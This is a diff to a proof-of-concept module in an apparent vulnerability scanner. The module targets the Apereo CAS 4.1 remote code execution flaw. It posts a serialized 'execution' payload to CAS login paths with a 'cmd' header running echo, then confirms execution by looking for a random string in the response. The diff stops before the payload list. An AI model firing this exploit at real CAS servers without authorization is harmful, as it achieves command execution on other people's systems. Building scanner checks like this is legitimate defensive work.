@@ -3,16 +3,17 @@
 # @Author  : caicai
 # @File    : poc_apereo_cas_rce_2019.py
 
-from myscan.lib.core.common import get_random_str
+from myscan.lib.core.common import get_random_str, check_echo
 from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
 from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
 from myscan.lib.core.threads import mythread
+from myscan.config import scan_set
 
 
 class POC():
     def __init__(self, workdata):
         self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
-        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
+        self.url = workdata.get("data", None)  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
         self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
         self.name = "apereo_cas_rce"
         self.vulmsg = "detail: https://github.com/vulhub/vulhub/blob/master/apereo-cas/4.1-rce/README.zh-cn.md"
@@ -21,51 +22,59 @@ class POC():
 
     def verify(self):
         # 限定根目录
-        if self.url.count("/") != 3:
-            return
+        if self.url is not None:
+            if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
+                return
         mythread(self.run, self.get_payloads())
 
     def run(self, payload):
         if self.success:
             return
-        host = self.dictdata["url"]["host"]
-        port = self.dictdata["url"]["port"]
-        rand_str = get_random_str(7).lower()
-        req = {
-            "method": "POST",
-            "url": self.url + "cas/login",
-            "timeout": 30,
-            "headers": {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Connection": "close",
-                "Accept": "*/*",
-                "Origin": "https://{}:{}".format(host, port),
-                "Sec-Fetch-Site": "same-origin",
-                "Sec-Fetch-Mode": "cors",
-                "cmd": "echo {}".format(rand_str),
-                "Sec-Fetch-Dest": "empty",
-                "Referer": "https://{}:{}/".format(host, port),
-                "Accept-Encoding": "gzip, deflate",
-                "Accept-Language": "zh-CN,zh;q=0.9"},
-            "data": '''username=test&password=test&lt=LT-2-cZbwGIaGIX1dKwYcGivxcnBY2Puu5b-cas01.example.org&execution={}&_eventId=submit&submit=LOGIN'''.format(
-                payload),
-            "allow_redirects": False,
-            "verify": False,
-        }
-        r = request(**req)
-        if r is not None and rand_str.encode() in r.content[:len(rand_str)] and not self.success:
-            self.success = True
-            parser_ = response_parser(r)
-            self.result.append({
-                "name": self.name,
-                "url": parser_.geturl(),
-                "level": self.level,  # 0:Low  1:Medium 2:High
-                "detail": {
-                    "vulmsg": self.vulmsg,
-                    "request": parser_.getrequestraw(),
-                    "response": parser_.getresponseraw()
-                }
-            })
+        rand_str1 = get_random_str(7).lower()
+        rand_str2 = get_random_str(7).lower()
+        rand_str = "{} {}".format(rand_str1, rand_str2)
+        urls = []
+        if self.url is not None:
+            for path in ["cas/login", "cas-server/login"]:
+                urls.append(self.url + path)
+        else:
+            urls.append(self.dictdata.get("url").get("url"))
+        for url in urls:
+            req = {
+                "method": "POST",
+                "url": url,
+                "timeout": 30,
+                "headers": {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Connection": "close",
+                    "Accept": "*/*",
+                    "Origin": "{protocol}://{host}:{port}".format(**self.dictdata["url"]),
+                    "Sec-Fetch-Site": "same-origin",
+                    "Sec-Fetch-Mode": "cors",
+                    "cmd": "echo {}".format(rand_str),
+                    "Sec-Fetch-Dest": "empty",
+                    "Referer": "{protocol}://{host}:{port}".format(**self.dictdata["url"]),
+                    "Accept-Encoding": "gzip, deflate",
+                    "Accept-Language": "zh-CN,zh;q=0.9"},
+                "data": '''username=test&password=test&lt=LT-2-cZbwGIaGIX1dKwYcGivxcnBY2Puu5b-cas01.example.org&execution={}&_eventId=submit&submit=LOGIN'''.format(
+                    payload),
+                "allow_redirects": False,
+                "verify": False,
+            }
+            r = request(**req)
+            if r is not None and check_echo(r.content, rand_str1, rand_str2) and not self.success:
+                self.success = True
+                parser_ = response_parser(r)
+                self.result.append({
+                    "name": self.name,
+                    "url": parser_.geturl(),
+                    "level": self.level,  # 0:Low  1:Medium 2:High
+                    "detail": {
+                        "vulmsg": self.vulmsg,
+                        "request": parser_.getrequestraw(),
+                        "response": parser_.getresponseraw()
+                    }
+                })
 
     def get_payloads(self):
         return [
